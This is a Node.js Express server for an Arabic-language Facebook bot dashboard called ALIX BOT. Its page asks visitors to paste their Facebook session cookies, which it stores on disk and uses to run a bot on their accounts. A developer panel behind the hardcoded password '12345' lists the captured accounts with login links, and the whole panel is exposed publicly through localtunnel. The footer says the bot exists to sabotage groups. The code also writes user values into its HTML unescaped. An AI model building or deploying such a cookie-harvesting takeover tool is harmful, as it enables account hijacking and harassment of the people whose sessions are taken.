const localtunnel = require('localtunnel');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs-extra');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

let connectedAccounts = [];

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>اليكسي بوت - ALIX BOT</title>
            <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
            <style>
                body { font-family: 'Cairo', sans-serif; background-color: #1a1a1a; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
                .container { background: #2a2a2a; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; max-width: 450px; width: 90%; position: relative; }
                .profile-img { width: 150px; height: 150px; border-radius: 50%; object-fit: cover; margin-bottom: 1rem; border: 3px solid #ff4757; }
                h1 { margin: 0; color: #ff4757; }
                h2 { margin: 0.5rem 0 1.5rem; font-size: 1.2rem; color: #ccc; }
                textarea { width: 100%; height: 120px; padding: 10px; border-radius: 5px; border: 1px solid #444; background: #333; color: white; margin-bottom: 1rem; box-sizing: border-box; font-family: monospace; }
                button { background: #ff4757; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; font-size: 1rem; }
                button:hover { background: #ff6b81; }
                .nav-links { margin-top: 1.5rem; display: flex; justify-content: space-around; flex-wrap: wrap; gap: 10px; }
                .nav-link { color: #70a1ff; text-decoration: none; font-weight: bold; }
                .footer { margin-top: 2rem; font-size: 0.9rem; color: #aaa; border-top: 1px solid #444; padding-top: 1rem; }
                .footer a { color: #ff4757; text-decoration: none; }
                .dev-btn { position: absolute; top: 10px; right: 10px; font-size: 0.8rem; background: #444; padding: 5px 10px; border-radius: 5px; text-decoration: none; color: white; }
            </style>
        </head>
        <body>
            <div class="container">
                <a href="/developer-login" class="dev-btn">المطور</a>
                <img src="https://i.ibb.co/ynZXVMbd/991b35349a4ada4789c8d9dcf591a095.gif" class="profile-img" alt="Anime">
                <h1>اليكسي بوت</h1>
                <h2>ALIX BOT</h2>
                
                <div style="margin-bottom: 15px;">
                    <a href="https://www.facebook.com/profile.php?id=61587844010188" target="_blank" style="color: #ff4757; text-decoration: none; font-weight: bold;">أربرت ساما</a>
                    <a href="https://www.facebook.com/profile.php?id=61587844010188" target="_blank" style="margin-right: 15px; color: #70a1ff; text-decoration: none; font-weight: bold;">مراسلة</a>
                </div>

                <form action="/login" method="POST">
                    <textarea name="appState" placeholder="ضع كوكيزك هنا لكي يعمل البوت بحسابك..." required></textarea>
                    <button type="submit">ضع كوكيزك هنا</button>
                </form>
                
                <div class="nav-links">
                    <a href="/devices" class="nav-link">الأجهزة المتصلة (${connectedAccounts.length})</a>
                </div>

                <div class="footer">
                    انا المطور اربرت ساما تم صنع البوت لغرض تخريب وتسليه للكروبات السيئه ونا غير مسؤل عن استخدامكم به
                </div>
            </div>
        </body>
        </html>
    `);
});

app.get('/developer-login', (req, res) => {
    res.send(`
        <body style="background:#1a1a1a; color:white; font-family:Cairo; display:flex; align-items:center; justify-content:center; height:100vh;">
            <form action="/developer" method="POST" style="background:#2a2a2a; padding:2rem; border-radius:10px; text-align:center;">
                <h3>خانة المطور</h3>
                <input type="password" name="password" placeholder="كلمة المرور" style="padding:10px; margin-bottom:10px; border-radius:5px; border:none;"><br>
                <button style="background:#ff4757; color:white; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">دخول</button>
            </form>
        </body>
    `);
});

app.post('/developer', (req, res) => {
    const { password } = req.body;
    if (password === "12345") {
        let rows = connectedAccounts.map(acc => `
            <li style="background:#2a2a2a; margin:10px; padding:15px; border-radius:10px; display:flex; align-items:center; justify-content:space-between;">
                <div style="display:flex; align-items:center;">
                    <img src="https://graph.facebook.com/${acc.id}/picture?type=large" style="width:50px; height:50px; border-radius:50%; margin-left:15px;">
                    <div>
                        <strong>${acc.id}</strong><br>
                        <small>${acc.time}</small>
                    </div>
                </div>
                <div>
                    <form action="/kick" method="POST" style="display:inline;">
                        <input type="hidden" name="id" value="${acc.id}">
                        <button style="background:red; color:white; border:none; padding:5px 10px; border-radius:5px; cursor:pointer;">طرد</button>
                    </form>
                    <a href="https://www.facebook.com/${acc.id}" target="_blank" style="background:#70a1ff; color:white; padding:5px 10px; border-radius:5px; text-decoration:none; margin-right:5px;">تسجيل دخول</a>
                </div>
            </li>
        `).join('');
        res.send(`
            <body style="background:#1a1a1a; color:white; font-family:Cairo; padding:2rem;">
                <h1 style="color:#ff4757; text-align:center;">لوحة تحكم المطور</h1>
                <ul style="list-style:none; padding:0; max-width:800px; margin:auto;">${rows || "لا توجد حسابات"}</ul>
                <div style="text-align:center; margin-top:20px;"><a href="/" style="color:white;">العودة</a></div>
            </body>
        `);
    } else {
        res.send("كلمة مرور خاطئة");
    }
});

app.post('/kick', (req, res) => {
    const { id } = req.body;
    const index = connectedAccounts.findIndex(acc => acc.id === id);
    if (index !== -1) {
        const acc = connectedAccounts[index];
        if (acc.appStatePath && fs.existsSync(acc.appStatePath)) {
            fs.removeSync(acc.appStatePath);
        }
        connectedAccounts.splice(index, 1);
        // Also stop the instance if possible (requires more logic in main.js, but this is a start)
        if (global.apiInstances && global.apiInstances.has(id)) {
            const api = global.apiInstances.get(id);
            api.logout(() => {});
            global.apiInstances.delete(id);
        }
    }
    res.send('<h1>تم طرد الحساب!</h1><a href="/">العودة</a>');
});

app.post('/login', (req, res) => {
    const { appState } = req.body;
    try {
        const state = JSON.parse(appState);
        const accountId = Date.now().toString();
        const fileName = "appstate_" + accountId + ".json";
        fs.writeJSONSync(path.join(__dirname, fileName), state);
        if (global.startNewAccount) global.startNewAccount(path.join(__dirname, fileName));
        res.send('<h1>تم إضافة الحساب بنجاح! البوت يعمل الآن.</h1><a href="/">العودة للرئيسية</a>');
    } catch (e) {
        res.send('<h1>خطأ في الكوكيز! تأكد من التنسيق.</h1><a href="/">العودة</a>');
    }
});

app.get('/devices', (req, res) => {
    let rows = connectedAccounts.map(acc => `
        <li>
            <div class="acc-info">
                <strong>حساب:</strong> <a href="https://www.facebook.com/${acc.id}" target="_blank">فيس بوك (${acc.id})</a><br>
                <strong>متصل منذ:</strong> ${acc.time}<br>
                <strong>الحالة:</strong> <span style="color: #2ed573;">متصل نشط ✅</span>
            </div>
        </li>
    `).join('');
    if (rows === '') rows = '<li>لا توجد حسابات نشطة حالياً</li>';
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>الأجهزة المتصلة - ALIX BOT</title>
            <style>
                body { font-family: 'Cairo', sans-serif; background: #1a1a1a; color: white; padding: 2rem; }
                .container { max-width: 600px; margin: auto; }
                h1 { color: #ff4757; text-align: center; }
                ul { list-style: none; padding: 0; }
                li { background: #2a2a2a; margin: 15px 0; padding: 20px; border-radius: 10px; border-right: 5px solid #ff4757; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
                .acc-info a { color: #70a1ff; text-decoration: none; font-weight: bold; }
                .back-btn { display: inline-block; margin-top: 20px; color: #ff4757; text-decoration: none; font-weight: bold; border: 1px solid #ff4757; padding: 8px 15px; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>الحسابات المرتبطة ببوتي</h1>
                <ul>${rows}</ul>
                <a href="/" class="back-btn">العودة للرئيسية</a>
            </div>
        </body>
        </html>
    `);
});

function listen(callback) {
    app.listen(port, async () => {
        let url = "http://localhost:" + port;
        if (process.env.REPL_SLUG && process.env.REPL_OWNER) url = "https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co";
        console.log("[SERVER] Local Dashboard running at: " + url);
        let publicUrl = url;
        
        // Use localtunnel for public URL generation as requested
        try {
            const tunnel = await localtunnel({ port: port });
            publicUrl = tunnel.url;
            console.log("[SERVER] Public Dashboard running at: " + publicUrl);
            
            // Set up a mechanism to keep the tunnel alive or report status
            tunnel.on('close', () => {
                console.log("[SERVER] Localtunnel closed, attempting to restart...");
            });
        } catch (e) {
            console.error("[SERVER] Localtunnel error:", e);
        }

        fs.writeFileSync(path.join(__dirname, 'gag.js'), "// رابط البوت الخاص بك:\nconst dashboardURL = \"" + publicUrl + "\";\nconsole.log(\"رابط لوحة التحكم: \", dashboardURL);");
        if (callback) callback(publicUrl);
    });
}

module.exports = { listen, connectedAccounts };
